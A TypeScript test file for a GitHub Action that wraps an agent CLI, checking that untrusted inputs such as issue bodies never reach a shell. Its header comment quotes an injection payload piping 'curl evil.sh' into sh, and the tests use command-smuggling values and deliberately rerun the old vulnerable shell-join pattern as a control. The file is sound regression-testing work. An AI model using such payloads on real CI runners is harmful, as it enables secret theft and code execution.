/**
 * SEC-006 — `task` (and every other action input) is untrusted: the documented use of this action is
 * `task: ${{ github.event.issue.body }}`, i.e. text an arbitrary GitHub user wrote. The action used to
 * run `execSync(args.join(' '))`, which hands the joined string to `/bin/sh`, so an issue body of
 * `hi; curl evil.sh | sh #` executed on the runner with the repo's `ANTHROPIC_API_KEY` in scope.
 *
 * The task now reaches the CLI only on stdin, and every other input only as a literal argv element.
 * These tests execute real payloads rather than asserting on source text, so they observe the defect
 * rather than the spelling of the fix.
 */
import { execSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { buildCliArgs } from '../src/build-invocation.mjs';
import { runCli } from '../src/node-io.mjs';

/**
 * The payload names the marker relative to the child's `cwd` rather than by its absolute path, so the
 * CONTROL case below feeds a shell only literal text — no temp-directory path is ever interpolated into
 * a command string.
 */
const MARKER_NAME = 'PWNED';
const PAYLOAD = `hello; touch ${MARKER_NAME} #`;

const ARGS = { model: '', output: 'text', maxTurns: '', loadProject: false };

describe('SEC-006: action inputs must never reach a shell', () => {
  let dir: string;
  let marker: string;

  beforeEach(() => {
    dir = realpathSync(mkdtempSync(join(tmpdir(), 'action-injection-')));
    marker = join(dir, MARKER_NAME);
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it('hands a shell payload in the task to the CLI as stdin text, and runs nothing', () => {
    // Stands in for the CLI: echoes its argv and stdin back.
    const entry = join(dir, 'echo-cli.cjs');
    writeFileSync(
      entry,
      "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>process.stdout.write(JSON.stringify({argv:process.argv.slice(2),stdin:s})));\n",
    );

    const out = runCli(entry, buildCliArgs(ARGS), { PATH: process.env.PATH }, dir, PAYLOAD);

    expect(JSON.parse(out)).toEqual({
      argv: ['--safe-mode', '--output-format', 'text', '-p'],
      stdin: PAYLOAD,
    });
    expect(existsSync(marker)).toBe(false);
  });

  it('keeps the model and max-turns inputs as single literal argv elements', () => {
    const args = buildCliArgs({
      ...ARGS,
      model: 'x; touch /tmp/nope',
      maxTurns: '3; touch /tmp/nope',
    });
    expect(args[args.indexOf('--model') + 1]).toBe('x; touch /tmp/nope');
    expect(args[args.indexOf('--max-turns') + 1]).toBe('3; touch /tmp/nope');
  });

  it('CONTROL: the previous join-into-a-shell shape really did execute the payload', () => {
    // Pins WHY the fix is shaped this way. If this ever stops reproducing, the threat model changed
    // and the reasoning above should be revisited rather than silently trusted.
    execSync(['echo', ...buildCliArgs(ARGS), PAYLOAD].join(' '), {
      cwd: dir,
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    expect(existsSync(marker)).toBe(true);
  });
});

describe('a task that names a subcommand is still only a prompt', () => {
  let root: string;

  beforeEach(() => {
    root = realpathSync(mkdtempSync(join(tmpdir(), 'action-subcommand-task-')));
  });
  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('does not let a task of "eval" load a file from the checkout', () => {
    // As an argument, `robota -p -- eval` ran `robota eval`, which imported the next word — the
    // output format, `text` — from the checkout as an eval definition.
    const checkout = join(root, 'checkout');
    const home = join(root, 'home');
    mkdirSync(checkout);
    mkdirSync(home);
    const marker = join(root, 'CHECKOUT-CODE-RAN');
    writeFileSync(
      join(checkout, 'text'),
      `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'x');\n`,
    );
    const cliPackage = createRequire(import.meta.url).resolve('@robota-sdk/agent-cli/package.json');
    const entry = join(dirname(cliPackage), 'bin', 'robota.cjs');

    // No provider is configured, so the CLI fails; what matters is what it ran first.
    expect(() =>
      runCli(entry, buildCliArgs(ARGS), { PATH: process.env.PATH, HOME: home }, checkout, 'eval'),
    ).toThrow();
    expect(existsSync(marker)).toBe(false);
  });
});
